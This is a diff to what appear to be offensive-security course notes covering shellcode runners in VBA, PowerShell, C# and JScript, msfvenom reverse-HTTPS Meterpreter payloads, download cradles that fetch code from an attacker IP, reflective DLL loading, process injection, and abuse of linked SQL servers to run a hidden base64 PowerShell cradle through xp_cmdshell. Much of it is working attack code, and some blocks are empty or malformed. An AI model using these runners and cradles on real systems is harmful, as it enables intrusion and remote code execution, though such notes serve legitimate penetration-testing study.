@@ -107,6 +107,8 @@ Sub Wait(n As Long)
 End Sub
 ```
 
+Create an Excel macro that runs when opening an Excel spreadsheet using **Workbook_Open**.
+
 ## Phishing PreTexting
 
 1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
@@ -130,6 +132,12 @@ End Sub
 ```
 
 ## VBA Shellcode Runner
+
+Use **VirtualAlloc** to allocate unmanaged memory that is writable, readable, and executable.
+
+Copy the shellcode into the newly allocated memory with **RtlMoveMemory**, and
+
+Create a new execution thread in the process through **CreateThread** to execute the shellcode.
 
 Meterpreter Handler (x86)
 
@@ -178,6 +186,15 @@ End Sub
 
 ## Porting Shellcode Runner to PowerShell
 
+Use the .NET **Copy** method from the `System.Runtime.InteropServices.Marshal` namespace to copy data from a managed array to an unmanaged memory pointer.
+
+Previous VBA shellcode runner continued executing because we never terminated its parent process (Word). 
+
+In this version, our shell dies as soon as the parent PowerShell process terminates.
+
+=> Instruct PowerShell to delay termination until our shell fully executes using the Win32 **WaitSingleObject** API
+
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
 ```
@@ -213,7 +230,7 @@ $size = $buf.Length
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
-```
+``
 
 ```VB
 Sub MyMacro()
@@ -232,6 +249,22 @@ End Sub
 ```
 
 ## Reflection Shellcode Runner in PowerShell
+
+2 primary ways to locate functions in unmanaged dynamic link libraries:
+
+1. **Add-Type** and **DllImport** keywords (or the Declare keyword in VBA). However, Add-Type calls the csc compiler, which writes to disk.
+
+2. Dynamic lookup
+
+To perform a dynamic lookup of function addresses, 2 special Win32 APIs:
+
+1. **GetModuleHandle** obtains a handle to the specified DLL, i.e. the memory address of the DLL.
+
+2. Pass the DLL handle and the function name to **GetProcAddress**, which will return the function address.
+
+Using **GetType** to obtain a reference to the `System.dll` assembly at runtime => **Reflection** technique.
+
+**GetMethod** function to obtain a reference to the internal GetModuleHandle method.
 
 ### run2.txt
 
@@ -324,6 +357,8 @@ $wc.DownloadString("http://192.168.119.120/run.ps1")
 
 ## Give Me A SYSTEM Proxy
 
+SysInternals PsExec SYSTEM integrity 32-bit PowerShell ISE command prompt:
+
 * -s: run it as SYSTEM
 * -i: make it interactive with the current desktop
 
@@ -340,7 +375,7 @@ Proxy settings for each user are stored in the registry at
 
 When navigating the registry, the **HKEY_CURRENT_USER** registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
 
-The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. => Map the HKEY_USERS registry hive with the **New-PSDrive**
+The **HKEY_USERS** registry hive always exists and contains the content of all user **HKEY_CURRENT_USER** registry hives split by their respective **SIDs**. => Map the HKEY_USERS registry hive with **New-PSDrive**
 
 Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
 
@@ -360,6 +395,8 @@ $wc.DownloadString("http://192.168.119.120/run2.ps1")
 The default application for `.js` files is the Windows-Based Script Host
 
 ## Jscript Meterpreter Dropper
+
+Use the Jscript file format to execute Javascript on Windows targets through the Windows Script Host.
 
 ### run.js
 
@@ -442,6 +479,10 @@ mkdir /home/kali/data
 chmod -R 777 /home/kali/data
 ```
 
+```cmd
+\\192.168.119.120\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe
+```
+
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -478,89 +519,11 @@ namespace ShellcodeRunner
 }
 ```
 
-### Shellcode Parameter
+## Jscript Shellcode Runner (DotNetToJscript)
 
-```csharp
-using System;
-using System.Runtime.InteropServices;
-using System.Net.Http;
-using System.Text.RegularExpressions;
+Open DotNetToJscript in Visual Studio, open `TestClass.cs` under the **ExampleAssembly** project. We'll compile this as a `.dll` assembly.
 
-namespace ShellcodeRunner
-{
-    class Program
-    {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-        static void Main(string[] args)
-        {
-            if (args.Length != 2)
-            {
-                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
-                return;
-            }
-
-            string url = "http://" + args[0] + "/" + args[1];
-
-            try
-            {
-                using (HttpClient client = new HttpClient())
-                {
-                    // Download the file content as a string directly into memory
-                    string declaration = client.GetStringAsync(url).Result; // Blocking call
-                    declaration = declaration.Trim();
-
-                    // Use a regex to extract the byte values
-                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
-                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
-
-                    if (match.Success)
-                    {
-                        string byteValues = match.Groups[1].Value;
-                        string[] hexArray = byteValues.Split(',');
-
-                        // Create the byte array with the dynamic size based on the number of hex values
-                        byte[] buf = new byte[hexArray.Length];
-
-                        for (int i = 0; i < hexArray.Length; i++)
-                        {
-                            // Convert each hex string to a byte
-                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
-                        }
-
-                        int size = buf.Length;
-
-                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
-                        Marshal.Copy(buf, 0, addr, size);
-
-                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-                        WaitForSingleObject(hThread, 0xFFFFFFFF);
-                    }
-                    else
-                    {
-                        Console.WriteLine("The file does not contain a valid byte array declaration.");
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error reading file: {ex.Message}");
-            }
-        }
-    }
-}
-```
-
-## Jscript Shellcode Runner
+Jscript will eventually execute the content of the **TestClass** method, which is inside the TestClass class.
 
 ```csharp
 using System;
@@ -604,13 +567,17 @@ public class TestClass
 }
 ```
 
+DotNetToJscript converts the assembly into a format that Jscript can execute.
+
+Copy `DotNetToJscript.exe` and `NDesk.Options.dll` to the `C:\Tools` folder. Then copy `ExampleAssembly.dll` to C:\Tools.
+
 ```bat
 DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 ```
 
 ## SharpShooter
 
-SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code". SharpShooter is capable of evading various types of security software.
+SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code".
 
 `https://github.com/mdsecactivebreach/SharpShooter`
 
@@ -623,6 +590,9 @@ sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --outp
 ```
 
 ## Reflective Load
+
+**Class Library (.Net Framework)**: Create a managed DLL when we compile.
+ 
 
 ```csharp
 using System;
@@ -661,10 +631,20 @@ namespace ReflectiveLoad
 }
 ```
 
+Use the **LoadFile** method from the `System.Reflection.Assembly` namespace to dynamically load our pre-compiled C# assembly into the process. 
+
 ```pwsh
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
 $assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")
+
+$class = $assem.GetType("ReflectiveLoad.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
 ```
+
+Executing this PowerShell will download the assembly to disk before loading it.
+
+=> Use the **Load** method, which accepts a Byte array in memory instead of a disk file and the **DownloadData** method of the `Net.WebClient` class to download the DLL as a byte array.
 
 ```pwsh
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
@@ -675,11 +655,15 @@ $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
 
+**IronPython**,  lets a penetration tester combine the power of Python and .NET. **Trinity** is a framework for implementing this post-exploitation.
+
+Java-based Java Applets and **Java** JAR files can be used to gain client-side code execution. Java also contains a built-in JavaScript scripting engine called **Nashhorn**.
+
 # Process Injection and Migration
 
 ## Process Injection in C#
 
-Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, ...
+Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread
 
 ### VirtualAllocEx and WriteProcessMemory
 
@@ -4952,8 +4936,6 @@ Determine the username it is mapped to with the **USER_NAME()** function.
 
 The **IS_SRVROLEMEMBER** function can be used to determine if a specific login is a member of a server role.
 
-`Sql.exe`
-
 ```csharp
 using System;
 using System.Data.SqlClient;
@@ -5495,7 +5477,7 @@ type \\dc01\c$\tools\file.txt
 
 If a database has the TRUSTWORTHY property set, it's possible to use the **CREATE ASSEMBLY** statement to import a managed DLL as an object inside the SQL server and execute methods within it.
 
-Create a managed DLL by creating a new "Class Library (.NET Framework)" project.
+Create a managed DLL by creating a new "**Class Library (.NET Framework)**" project.
 
 Write code that starts a command prompt and executes the command given inside the **execCommand** argument.
 
@@ -5708,6 +5690,257 @@ namespace SQL
 
 ```pwsh
 Sql.exe
+```
+
+## Linked SQL Servers
+
+When a link from one SQL server to another is created, the administrator must specify the execution context that will be used during the connection.
+
+While it is possible to have the context be **dynamic** based on the security context of the current login, some administrators opt to choose a specific SQL login instead.
+
+If the administrator chooses a specific SQL login and that login has **sysadmin** role membership => obtain sysadmin privileges on the linked SQL server.
+
+This will be the case even if we only have low privileged access on the original SQL server.
+
+Enumerate servers linked to the current SQL server. The **sp_linkedservers** stored procedure returns a list of linked servers.
+
+**sp_linkedservers** does not require any privileges to execute.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "appsrv01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String execCmd = "EXEC sp_linkedservers;";
+
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            while (reader.Read())
+            {
+                Console.WriteLine("Linked SQL server: " + reader[0]);
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Perform a SQL query on a linked server.
+
+Find the version of the SQL server instance on dc01  using the **OPENQUERY** keyword.
+
+```
+select version from openquery("dc01", 'select @@version as version')
+```
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "appsrv01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String execCmd = "select version from openquery(\"dc01\", 'select @@version as version')";
+
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Linked SQL server version: " + reader[0]);       
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+Let's see which security context we are executing in.
+
+Replace the query for the SQL version to the SQL login with SYSTEM_USER
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "appsrv01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing as the login " + reader[0] + " on APPSRV01");
+            reader.Close();
+
+
+            String execCmd = "select systemuser from openquery(\"dc01\", 'SELECT SYSTEM_USER as systemuser')";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing as the login " + reader[0] + " on DC01");
+            reader.Close();           
+
+            con.Close();
+        }
+    }
+}
+```
+
+Our local login is our domain user, while the linked security context is sa => gain code execution.
+
+Execute our PowerShell shellcode runner through a download cradle with the **xp_cmdshell** stored procedure.
+
+When this statement is executed against a remote server, Microsoft SQL uses Remote Procedure Call (RPC). For this to work, the created link must be configured with outbound RPC through the **RPC Out** setting.
+
+RPC Out is not a setting that is turned on by default, 
+
+=> Enable with the **sp_serveroption** stored procedure if our current user has sysadmin role membership.
+
+Microsoft documentation for **OPENQUERY** specifically states that executing stored procedures is not supported on linked SQL servers.
+
+=> Use the **AT** keyword to specify which linked SQL server a query should be executed on.
+
+### Use the AT keyword
+
+```
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
+```
+
+The SQL escape character for a single quote is a single quote => double them on the inner strings.
+
+Similarly, enable **xp_cmdshell** and invoke it on dc01.
+
+```
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
+```
+
+Base64 encoding the download cradle and invoking it with the EncodedCommand parameter.
+
+Setting up a Meterpreter listener (Note that the SQL server process is terminated when the shell exits unless EXITFUNC is set to thread.)
+
+```bash
+
+```
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "appsrv01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String execCmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01";
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+
+            execCmd = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            execCmd = "EXEC ('xp_cmdshell ''powershell -exec bypass -nop -w hidden -e <base64>'';') AT DC01";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+### Use the OPENQUERY keyword
+
+While Microsoft documentation specifies that execution of stored procedures is not supported on linked SQL servers with the OPENQUERY keyword, it is actually possible.
+
+```csharp
+
 ```
 
 # Active Directory Exploitation
